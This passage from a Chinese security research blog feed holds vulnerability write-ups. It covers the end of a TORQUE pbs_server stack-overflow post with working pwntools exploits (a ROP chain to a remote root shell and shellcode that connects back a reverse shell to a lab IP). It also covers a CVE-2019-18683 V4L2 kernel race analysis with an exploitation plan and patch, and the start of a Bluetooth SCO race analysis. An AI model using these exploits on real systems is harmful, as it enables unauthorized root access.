            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="o">+</span> \             <span class="c1"># socket句柄的fd=10
</span>            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">got_snprintf</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> \      <span class="c1"># write(10, got_snprintf, 8) 泄露snprintf函数地址
</span>            <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> \            <span class="c1"># 让rsp 16字节对齐, 否则有些地方会段错误 ?????
</span>            <span class="nf">p64</span><span class="p">(</span><span class="n">main_loop</span><span class="p">)</span>          <span class="c1"># 返回到main_loop函数继续监听
</span>
<span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">+</span> <span class="n">payload</span>
<span class="n">rp</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>

<span class="n">snprintf_addr</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">rp</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>  <span class="c1"># 解析snprintf函数地址
</span><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">snprintf addr: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">snprintf_addr</span><span class="p">))</span>

<span class="n">libc</span> <span class="o">=</span> <span class="nc">LibcSearcher</span><span class="p">(</span><span class="sh">'</span><span class="s">snprintf</span><span class="sh">'</span><span class="p">,</span> <span class="n">snprintf_ad</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">snprintf_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="nf">dump</span><span class="p">(</span><span class="sh">'</span><span class="s">snprintf</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">libc base: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>              <span class="c1"># 计算libc基地址
</span>
<span class="n">dup2_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="nf">dump</span><span class="p">(</span><span class="sh">'</span><span class="s">dup2</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">dup2 addr: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">))</span>              <span class="c1"># 计算dup2函数地址
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="n">overflow_distance</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span> <span class="o">+</span> \       <span class="c1"># dup2(10, 0), socket句柄重定向到stdin
</span>            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> \ 
            <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span> <span class="o">+</span> \       <span class="c1"># dup2(10, 1), socket句柄重定向到stdout
</span>            <span class="nf">p64</span><span class="p">(</span><span class="n">main_loop</span><span class="p">)</span>           <span class="c1"># 返回main_loop函数继续监听
</span><span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">+</span> <span class="n">payload</span>
<span class="n">rp</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="n">overflow_distance</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">execv_plt</span><span class="p">)</span>           <span class="c1"># 执行execv("/bin/sh", NULL)获取远程shell
</span><span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">+</span> <span class="n">payload</span>
<span class="n">rp</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>

<span class="n">rp</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>rop方式获取远程root shell：</p>

<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/remote_root_shell.png" alt="remote root shell.png" /></p>

<h3 id="shellcode版本关闭nx">shellcode版本（关闭NX）</h3>

<p>shellcode解决方式，要关闭NX，效果是反弹shell到192.168.141.128主机的5555端口：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="sh">'</span><span class="s">linux</span><span class="sh">'</span>

<span class="n">rp</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">172.17.0.2</span><span class="sh">"</span><span class="p">,</span> <span class="mi">15001</span><span class="p">)</span>

<span class="n">overflow_distance</span> <span class="o">=</span> <span class="mi">103</span>     <span class="c1"># 实际溢出长度为103
</span><span class="n">jmp_rsp</span> <span class="o">=</span> <span class="mh">0x40900d</span>

<span class="c1"># 反弹shell到远程5555端口
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="sh">"</span><span class="s">192.168.141.128</span><span class="sh">"</span><span class="p">,</span> <span class="mi">5555</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="nf">dupsh</span><span class="p">())</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">*</span> <span class="n">overflow_distance</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">jmp_rsp</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span> 

<span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">+</span> <span class="n">payload</span>
<span class="n">rp</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
</code></pre></div></div>

<p>shellcode反弹shell：</p>

<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/shellcode%E6%89%93%E6%88%90%E5%8A%9F.png" alt="shellcode打成功.png" /></p>

<h1 id="参考资料">参考资料</h1>

<p>OSS公告：</p>

<p><a href="https://seclists.org/bugtraq/2014/May/75">Bugtraq: [CVE-2014-0749] TORQUE Buffer Overflow</a></p>

<p>torque的编译、安装、部署、使用</p>

<p><a href="https://www.jianghaizhi.com/bckf/1262.html">Torque安装部署以及使用方法详解</a></p>]]></content><author><name></name></author><category term="userspace" /><summary type="html"><![CDATA[漏洞位于pbs_server组件的tcp_gets函数。该函数从socket句柄读取TCP载荷，将获取的数据复制到栈上的时候没有进行数据检查造成栈溢出。 攻击者可以获取远程root shell]]></summary></entry><entry><title type="html">CVE-2019-18683 V4L2框架条件竞争漏洞分析</title><link href="http://localhost:4000/linux_kernel/2025/01/29/CVE-2019-18683-V4L2%E6%A1%86%E6%9E%B6%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" rel="alternate" type="text/html" title="CVE-2019-18683 V4L2框架条件竞争漏洞分析" /><published>2025-01-29T13:27:38+08:00</published><updated>2025-01-29T13:27:38+08:00</updated><id>http://localhost:4000/linux_kernel/2025/01/29/CVE-2019-18683-V4L2%E6%A1%86%E6%9E%B6%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</id><content type="html" xml:base="http://localhost:4000/linux_kernel/2025/01/29/CVE-2019-18683-V4L2%E6%A1%86%E6%9E%B6%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"><![CDATA[<p>CVE-2019-18683是Linux内核video4Linux2（V4L2）框架中一个高危的条件竞争漏洞。该漏洞源于videobuf2核心组件在内存映射（mmap）操作与缓冲区队列管理之间缺乏有效的同步机制，导致产生UAF漏洞。</p>

<h2 id="一环境搭建">一、环境搭建</h2>

<p>主机环境：Ubuntu 18.04</p>

<p>内核版本：linux 5.4.0-rc2</p>

<p>对.config文件进行如下配置，确保和漏洞相关的所有组件编译进内核：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">CONFIG_VIDEO_DEV</span><span class="o">=</span><span class="n">y</span>
<span class="n">CONFIG_VIDEO_V4L2</span><span class="o">=</span><span class="n">y</span>
<span class="n">CONFIG_VIDEO_VIVID</span><span class="o">=</span><span class="n">y</span>
</code></pre></div></div>

<p>编译安装内核：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/linux-5.4-rc2<span class="nv">$ </span>make menuconfig
/linux-5.4-rc2<span class="nv">$ </span>make <span class="nt">-j8</span>
/linux-5.4-rc2<span class="nv">$ </span><span class="nb">sudo </span>make modules_install
/linux-5.4-rc2<span class="nv">$ </span><span class="nb">sudo </span>make <span class="nb">install</span>
</code></pre></div></div>

<p>安装完成后重启系统，在/dev目录下出现video0和video1两个设备：</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/1.png" alt="截屏2025-01-17 10.00.34.png" /></p>

<h2 id="二v4l2框架介绍">二、V4L2框架介绍</h2>

<p>V4L2是video for linux version 2的简写，是Linux内核里面用于视频采集的框架。</p>

<p>该框架设计的目的是，为市面上型号繁杂的摄像头提供统一的接入方式，在内核层面抽象出调用框架，以内核API的形式提供给驱动开发者使用。用户态层面通过read/write、ioctl命令、mmap内存映射等系统调用，操作V4L2框架，实现摄像头的开启/关闭、取流/停止、摄像头参数修改、摄像头信息读取等功能。</p>

<p>框架结构如图所示，hardware层是针对不同的SoC芯片的驱动程序，主要包括硬件编码解码、图像画质的硬件处理、控制命令接口等功能。</p>

<p>external device层是连接的摄像头外设，通过USB、I2C、SPI、GPIO接口与SoC进行控制连接，通过MIPI图像传输接口与SoC进行图像传输连接。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/2.png" alt="截屏2025-01-17 10.38.24.png" /></p>

<p>v4l2-core目录是整个框架的核心，实现了内核API，实现了系统调用。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/3.png" alt="截屏2025-01-17 11.06.54.png" /></p>

<p>platform目录是不同SoC芯片的图像驱动，实现了hardware层功能。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/4.png" alt="截屏2025-01-17 11.07.47.png" /></p>

<p>CVE-2019-18683漏洞位于platform/vivid目录，是V4L2框架实现的自测驱动，该漏洞是通过syzkaller进行fuzz的时候发现的。</p>

<p>vivid驱动用于模拟外接视频源，使用vivid就可以不用外接摄像头来测试框架功能了。</p>

<h2 id="三漏洞原理">三、漏洞原理</h2>

<p>vivid模拟外接视频源的核心函数是vivid_thread_vid_cap。</p>

<p>打开取流后，该函数运行在内核线程上，源源不断向用户态申请的缓冲区复制随机生成的“视频帧”。在for无限循环中，生成并复制帧的操作是在dev→mutex信号量的保护之下的。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/5.png" alt="截屏2025-01-17 14.10.41.png" /></p>

<p>停止取流的操作中，主线程调用vivid_stop_generating_vid_cap杀掉vivid_thread_vid_cap内核线程，停止取流。</p>

<p>主线程进入到vivid_stop_generating_vid_cap函数之前，也是被dev→mutex信号量保护的，所以在vivid_stop_generating_vid_cap调用mutex_unlock释放信号量之前，vivid_thread_vid_cap内核线程实际上是一直在for循环中等待获取信号量的。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/6.png" alt="截屏2025-01-17 14.11.23.png" /></p>

<p>那么为何vivid_stop_generating_vid_cap要先解锁，才杀掉内核线程呢？</p>

<p>我认为，作者是想让vivid_thread_vid_cap内核线程最后一次执行完视频的生成，把那轮for循环执行结束再杀掉内核线程。</p>

<p>但是，如果vivid_stop_generating_vid_cap解锁之后，信号量没有被vivid_thread_vid_cap抢到，而是被vb2_fop_read抢走，那么vb2_fop_read会将那些因停止取流而标记为“待释放”的vb2_buffer重新加入活动链表。close的时候“待释放”的vb2_buffer会被kfree掉，但是由于它们还同时存在于活动链表中，另一个线程有可能继续操作活动链表，造成UAF。</p>

<p>该漏洞的竞争情况极为复杂，角度很刁钻，即使是漏洞发现者，也没有讲清楚里面的细节，只知道该漏洞的效果是造成kmalloc-1k对象的UAF。</p>

<h2 id="四条件竞争漏洞的测试方法">四、条件竞争漏洞的测试方法</h2>

<p>要分析条件竞争漏洞的触发原理，弄清楚多个线程之间的竞争窗口是一件不容易的事情。</p>

<p>一个常见的情况是，通过syzkaller打出了UAF，分析造成UAF的原因。</p>

<p>可以在锁操作语句的后面插入printk函数，打印系统的jiffies节拍、线程号等信息，直观的显示出哪个线程在哪个时间进入到了临界区，由此分析线程之间的竞争关系。</p>

<p>在这个漏洞中，syzkaller给出的poc主要逻辑是，创建2个线程分别绑定不同的cpu，每个线程都运行如下的for循环，若干循环之后触发UAF。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/7.png" alt="截屏2025-01-17 15.33.51.png" /></p>

<p>重点要关注线程A、线程B之间的read和close系统调用如何竞争。</p>

<p>对read系统调用的信号量操作插桩如下：</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/8.png" alt="截屏2025-01-17 15.49.23.png" /></p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/10.png" alt="截屏2025-01-17 15.58.10.png" /></p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/11.png" alt="截屏2025-01-17 16.02.09.png" /></p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/9.png" alt="截屏2025-01-17 15.52.26.png" /></p>

<p>对close系统调用的信号量操作插桩如下：</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/12.png" alt="截屏2025-01-17 16.06.36.png" /></p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/13.png" alt="截屏2025-01-17 21.11.08.png" /></p>

<p>dmesg日志分析：</p>

<p>第二列的数字表示jiffies节拍，jiffies是时钟中断计数器，cpu每到一次时钟中断，jiffies递增1，同时完成1次进程切换。</p>

<p>所以在打印日志中，jiffies的数值表示了两个线程运行的先后。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/14.png" alt="截屏2025-01-17 19.09.24.png" /></p>

<p>上图是一次成功的竞争过程中输出的日志，条件竞争的步骤是：
第一步，206线程首先进入vb2_fop_read获取信号量，在vb2_ops_wait_prepare函数中释放信号量；</p>

<p>第二步，207线程进入vb2_fop_read获取信号量，完整执行了read系统调用后，进入到close系统调用，并且在漏洞点vivid_stop_generating_vid_cap函数中释放了信号量。</p>

<p>第三步，206线程重新获取信号量，在vb2_core_qbuf函数中调用vid_cap_buf_queue函数，把vb2_buffer对象加入到vid_cap_active链表中。206线程执行完整个read系统调用释放信号量；</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/15.png" alt="截屏2025-01-17 21.31.56.png" /></p>

<p>第四步，207线程在vivid_stop_generating_vid_cap函数中重新获取信号量，后面进入到vb2_core_reqbufs函数，将vb2_buffer对象释放。此时的vb2_buffer对象虽然已经kfree掉了，但是vid_cap_active链表仍然保留着对它的引用；</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/16.png" alt="截屏2025-01-17 20.54.04.png" /></p>

<p>第六步，206线程执行close系统调用；</p>

<p>第七步，207线程开始了新的一轮open-read-close循环，重新进入到vb2_fop_read函数，在vid_cap_buf_queue函数中发生释放后重引用；</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/17.png" alt="截屏2025-01-17 21.40.41.png" /></p>

<p>原因是新的一轮vb2_fop_read申请了一个新的vb2_buffer对象，并且要把新的vb2_buffer对象加入到vid_cap_active链表中。</p>

<p>由于vid_cap_active链表中已经链接了一个已被释放的vb2_buffer对象，所以进行list_add_tail操作导致了新的vb2_buffer对象地址写入到已被释放的对象中，触发了UAF。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/18.png" alt="截屏2025-01-17 21.42.28.png" /></p>

<h2 id="五漏洞利用">五、漏洞利用</h2>

<h3 id="信息泄漏">信息泄漏</h3>

<p>在正式触发UAF之前，会首先触发WARN_ON语句，泄漏内核栈地址指针rsp和指向内核代码段地址的rcx寄存器。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/19.png" alt="截屏2025-01-19 15.22.42.png" /></p>

<p>WARN_ON语句位于__vb2_queue_cancel函数，位于调用close的过程中。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/20.png" alt="截屏2025-01-19 15.19.16.png" /></p>

<h3 id="控制流劫持">控制流劫持</h3>

<p>UAF的对象是vb2_buffer，目标是劫持vb2_buffer→vb2_queue→mem_ops→vaddr(void *buf_priv)</p>

<p>其中函数指针vaddr的参数正是vb2_buffer.planes[n].mem_priv指针的值。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/v4l2_objects.png" alt="v4l2_objects.png" /></p>

<p>构造内核对象可以放在内核栈上面，内核栈的基地址由WARN_ON语句泄漏的rsp寄存器计算得到。</p>

<p>目标明确为：</p>

<ol>
  <li>在内核栈构造vb2_queue对象，使得vb2_queue.mem_ops指向第2步构造的vb2_mem_ops；</li>
  <li>在内核栈构造vb2_mem_ops对象，其中vb2_mem_ops.vaddr指向rop gadget，用于劫持rip到内核栈；</li>
  <li>在内核栈构造rop chain，实现提权；</li>
  <li>堆喷射fake vb2_buffer对象，覆盖已经被UAF对象，其中vb2_buffer.planes[0].mem_priv指向rop chain。</li>
</ol>

<p>在内核栈构造内容基于的原理是，adjtimex()这类系统调用会把用户态内容copy_from_user到内核栈上面，再结合userfaultfd技术即可实现在内核栈构造任意内容。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/v4l2_payload.png" alt="v4l2_payload.png" /></p>

<p>调用read即可触发控制流劫持，函数调用链条是：</p>

<p>vb2_fop_read —&gt; vb2_read —&gt; __vb2_perform_fileio —&gt; __vb2_init_fileio —&gt; vb2_plane_vaddr</p>

<p>—&gt; fake vaddr</p>

<p>控制流劫持的效果是rip指针被劫持到内核栈rop chain区域，执行用于提权的rop chain。</p>

<p>rop chain的内容是执行内核函数run_cmd(”/bin/sh  /home/a13x/pwn”)，该函数由内核态发起，执行用户态命令，具有root权限。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/21.png" alt="截屏2025-01-19 16.42.42.png" /></p>

<h2 id="六漏洞修补">六、漏洞修补</h2>

<p>漏洞修补思路是用信号量完整的保护vivid_stop_generating_vid_cap函数杀掉vivid_thread_vid_cap内核线程的整个过程。</p>

<p>vivid_stop_generating_vid_cap函数去掉了中间加锁和解锁的步骤，使得整个过程被dev→mutex全程保护。</p>

<p>vivid_thread_vid_cap函数for循环中尝试去获取dev→mutex信号量，如果获取失败，那么线程睡眠1秒，线程醒来后continue循环，再次尝试获取dev→mutex，如此往复直到获取信号量。若检测到线程被杀掉，kthread_should_stop()返回ture，循环结束。</p>

<p><img src="/assets/posts/2025-01-29-CVE-2019-18683-V4L2框架条件竞争漏洞分析/22.png" alt="截屏2025-01-18 19.03.02.png" /></p>]]></content><author><name></name></author><category term="linux_kernel" /><summary type="html"><![CDATA[CVE-2019-18683是Linux内核video4Linux2（V4L2）框架中一个高危的条件竞争漏洞。该漏洞源于videobuf2核心组件在内存映射（mmap）操作与缓冲区队列管理之间缺乏有效的同步机制，导致产生UAF漏洞。]]></summary></entry><entry><title type="html">蓝牙sco条件竞争漏洞挖掘与分析</title><link href="http://localhost:4000/linux_kernel/2025/01/18/%E8%93%9D%E7%89%99sco%E9%A9%B1%E5%8A%A8%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.html" rel="alternate" type="text/html" title="蓝牙sco条件竞争漏洞挖掘与分析" /><published>2025-01-18T13:27:38+08:00</published><updated>2025-01-18T13:27:38+08:00</updated><id>http://localhost:4000/linux_kernel/2025/01/18/%E8%93%9D%E7%89%99sco%E9%A9%B1%E5%8A%A8%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98</id><content type="html" xml:base="http://localhost:4000/linux_kernel/2025/01/18/%E8%93%9D%E7%89%99sco%E9%A9%B1%E5%8A%A8%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.html"><![CDATA[<p>2023年使用syzkaller对Linux内核进行fuzz的过程中，发现了蓝牙协议栈sco子协议的条件竞争漏洞，2024年11月8日，在审计Linux内核网络协议栈中锁的使用的过程中，通过相似性分析的方法，再次发现了一个sco的条件竞争漏洞。</p>

<h2 id="一环境搭建">一、环境搭建</h2>

<p>发行版本Ubuntu24.04，内核版本Linux 6.11.5，打开KASAN、DEBUG_INFO、BT选项编译</p>

<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/1.png" alt="截屏2024-11-22 10.01.31.png" /></p>

<p>需要注意的是，vmware fusion 13.6往后的版本不支持蓝牙，所以我把版本降低到vmware fusion 13.5.2，该版本是唯一免费的个人使用版本。</p>

<p>USB兼容性设置为2.0，共享主机蓝牙，这样Ubuntu里面可以识别到主机蓝牙。</p>

<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/2.png" alt="截屏2024-11-11 11.12.04.png" /></p>

<p>对于Linux 5.17开始的内核会出现hciconfig hci0 up命令失败的情况，原因是Linux蓝牙驱动和虚拟机连接的主机蓝牙芯片不匹配。</p>

<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/WechatIMG427.jpg" alt="WechatIMG427.jpg" /></p>

<p>根本原因在于hci_cc_func函数中新加入了对数据包长度的校验。</p>

<p>若事件是HCI_OP_DELETE_STORED_LINK_KEY，那么通过查表得cc→min_len = 3，而skb→len = 2</p>

<p>此处校验就过不去。</p>

<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/3.png" alt="截屏2024-11-11 11.18.07.png" /></p>

<p>解决的方法是，在函数hci_cmd_complete_evt函数中判断</p>

<p>如果是HCI_OP_DELETE_STORED_LINK_KEY操作，那么直接返回*status=0，并在前面做必要的处理，这样就绕过了hci_cc_func函数。</p>

<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/4.png" alt="截屏2024-11-11 11.19.49.png" /></p>

<h2 id="二发现过程">二、发现过程</h2>

<h3 id="1-条件假设">1. 条件假设</h3>

<p>我在net目录中查找对内核套接字struct sock对象的未上锁访问时发现了这个bug。</p>

<p>我认为struct sock是在多个线程之间共享的。访问struct sock对象，特别是读写sk-&gt;sk_state，应提前调用lock_sock进行上锁，并在最后一次访问struct sock对象后调用release_sock进行解锁以防止线程之间的竞争。</p>

<p>现实依据是，我观察了多个网络协议的实现均是用这种方式保护struct sock的并发访问，例如tipc、can、蓝牙hci协议、packet、虚拟机套接字vmw_vsock等协议的实现。</p>

<p>CVE-2023-32606、CVE-2021-3609、CVE-2021-26708、CVE-2016-8655都是在读写struct sock对象的时候没有进行加锁保护导致的条件竞争。</p>

<p>其原理简单粗暴，以tipc协议的连接操作为例，使用lock_sock从一开始就把struct sock对象的操作保护起来，防止多线程并发访问的不同步导致状态机紊乱。</p>

<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/5.png" alt="截屏2024-11-22 10.15.03.png" /></p>

<h3 id="2-漏洞原理">2. 漏洞原理</h3>

<p>条件竞争漏洞发生在sco_sock_connect函数中，该函数被lock_sock分割为3个临界区。</p>

<p>一开始判断全局对象sk的状态这部分逻辑没有进行上锁保护，这一点很可疑。</p>

<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/6.png" alt="截屏2024-11-22 10.43.48.png" /></p>

<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/7.png" alt="截屏2024-11-22 10.46.22.png" /></p>

<p>如果同时来了两个connect调用，都通过了sk对象状态检查，开始竞争第一个临界区的锁，线程1首先创建一个sco_conn对象，并且sco_pi(sk)→conn指向sco_conn。</p>

<p>线程2创建第二个sco_conn对象，再次设置sco_pi(sk)→conn指向sco_conn，如此一来线程1创建的sco_conn就被悬空，再无指针可以引用它。</p>

<p><img src="/assets/posts/2025-01-18-蓝牙sco驱动条件竞争漏洞挖掘/8.png" alt="截屏2024-11-22 11.04.27.png" /></p>

<p>对象关系：</p>

